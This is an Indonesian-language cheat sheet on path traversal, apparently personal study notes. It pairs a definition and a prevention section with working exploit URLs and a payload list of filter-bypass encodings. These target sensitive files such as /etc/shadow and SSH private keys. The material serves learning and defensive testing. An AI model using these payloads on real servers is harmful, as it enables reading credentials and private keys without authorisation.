# Path Traversal
#lfi #pathtraversal 


## Definisi
Attacker dapat membaca file yang berada pada server aplikasi dengan berpindah lokasi folder. Dapat digunakan untuk membaca informasi sensitif pada server, contoh /etc/passwd.

## Vulnerable Code
```html
<img src="/loadImage?filename=mountain.png">
```
Aplikasi tersebut membaca file dari /var/www/images/mountain.png.

## Eksploitasi
Mengambil informasi sensitif pada `/etc/passwd` atau `windows\win.ini`. 
```http
# Linux
https://website.com/loadImage?filename=../../../../etc/passwd

# Windows
https://website.com/loadImage?filename=..\..\..\..\windows\win.ini
https://website.com/loadImage?filename=..\\..\\..\\..\\windows\\win.ini
```
Informasi sensitif:
```sh
# Linux, testing, non-sensitive
/etc/issue
/etc/motd

# Linux
/etc/passwd
/etc/shadow
/etc/environment
/home/$USER/.ssh/id_rsa
/home/$USER/.bash_history

# Windows, testing, non-sensitive
c:\windows\system32\license.rtf
c:\windows\system32\eula.txt

# Windows
c:\windows\system.ini
c:\windows\win.ini
```
## Payload
```sh
# basic
/etc/passwd
../../../etc/passwd

# bypass filter: encoding
%2e%2e%2fetc%2fpasswd

# double-encoding
%252e%252e%252fetc%252fpasswd

# non-standard encodings
%252e%252e%252f
..%ef%bc%8f

# filter: karakter .. atau / berurutan
....//....//
....\/.....\/
..../\..../\
....\\....\\

# filter: startswith /var/www/images
/var/www/images/../../../etc/passwd

# filter endwith *.jpg
../../../etc/passwd%00.jpg
```

Encoding
```
# ASCII
Dot - %2e
Forward slash - %2f
Backslash - %5c

# Double encoding
Dot - %252e
Forward slash - %252f
Backslash - %255c

# Overlong UTF-8
Dot - %c0%2e, %e0%40%ae, %c0ae, dll
Forward slash - %c0%af, %e0%80%af, %c0%2f, dll
Back slash - %c0%5c, %c0%80%5c, dll

# 16-bit Unicode
Dot - %u002e
Forward slash - %u2215
Backslash - %u2216
```

## Prevention
1. Tidak memperbolehkan user-input masuk ke filesystem API.
2. Apabila poin 1 tidak bisa dilakukan, pastikan terdapat validasi data sebelum diproses. Idealnya menggunakan whitelist. Lalu canocalized path harus berawal dari directori yang terekspektasi.

```php
File file = new File(BASE_DIRECTORY, userInput);
if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
    // process file
}
```

## Referensi
Definisi  
- https://portswigger.net/web-security/file-path-traversal  

Payload
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal  
- https://github.com/soffensive/windowsblindread/blob/master/windows-files.txt
- https://soffensive.github.io/posts/web-app-sec/2018-06-19-exploiting-blind-file-reads-path-traversal-vulnerabilities-on-microsoft-windows-operating-systems/
